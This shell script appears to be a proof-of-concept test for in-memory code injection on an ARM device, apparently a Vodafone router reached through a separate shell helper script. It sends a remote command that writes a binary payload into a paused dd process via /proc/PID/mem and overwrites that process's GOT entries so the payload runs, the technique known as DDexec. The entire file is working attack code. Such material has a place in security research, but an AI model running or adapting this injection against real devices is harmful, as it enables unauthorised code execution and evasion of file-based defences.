#!/bin/sh
set -eu

host="${1:-192.168.100.11}"
port="${2:-9536}"
blob="$(od -An -v -to1 ddexec-arm-marker.bin | tr -s ' ' '\n' | sed '/^$/d;s/^/\\/' | tr -d '\n')"

remote="printf '$blob' >/tmp/ddexec-arm-marker.bin; /bin/dd if=/dev/zero of=/dev/null bs=4096 & p=\$!; /bin/sleep 1; kill -STOP \$p; base=\$(/usr/bin/awk '\$6==\"/bin/busybox\"&&\$3==\"00000000\"{split(\$1,a,\"-\");print a[1];exit}' /proc/\$p/maps); stub=\$((0x\$base+0x7e800)); rgot=\$((0x\$base+0x8fb08)); wgot=\$((0x\$base+0x8fdf4)); echo TARGET=\$p BASE=\$base STUB=\$stub READ_GOT=\$rgot WRITE_GOT=\$wgot; /bin/dd if=/tmp/ddexec-arm-marker.bin of=/proc/\$p/mem bs=1 seek=\$stub conv=notrunc; rc1=\$?; printf \"\\\\\$(printf '%03o' \$((stub&255)))\\\\\$(printf '%03o' \$(((stub>>8)&255)))\\\\\$(printf '%03o' \$(((stub>>16)&255)))\\\\\$(printf '%03o' \$(((stub>>24)&255)))\" >/tmp/ddexec-arm-pointer.bin; /bin/dd if=/tmp/ddexec-arm-pointer.bin of=/proc/\$p/mem bs=1 seek=\$rgot conv=notrunc; rc2=\$?; /bin/dd if=/tmp/ddexec-arm-pointer.bin of=/proc/\$p/mem bs=1 seek=\$wgot conv=notrunc; rc3=\$?; echo STUB_WRITE_RC=\$rc1 READ_GOT_RC=\$rc2 WRITE_GOT_RC=\$rc3; if test \$rc1 -eq 0 -a \$rc2 -eq 0 -a \$rc3 -eq 0; then kill -CONT \$p; else kill -KILL \$p; fi; /bin/sleep 2; if kill -0 \$p 2>/dev/null; then echo TARGET_STILL_ALIVE; kill -KILL \$p; else wait \$p; echo TARGET_EXIT_RC=\$?; fi; /bin/rm /tmp/ddexec-arm-marker.bin /tmp/ddexec-arm-pointer.bin 2>/dev/null || true; echo TEST_DONE"

{
    sleep 3
    printf '%s\n' "$remote"
    sleep 6
} | timeout 14 ./vodafone-direct-shell.sh "$host" "$port"
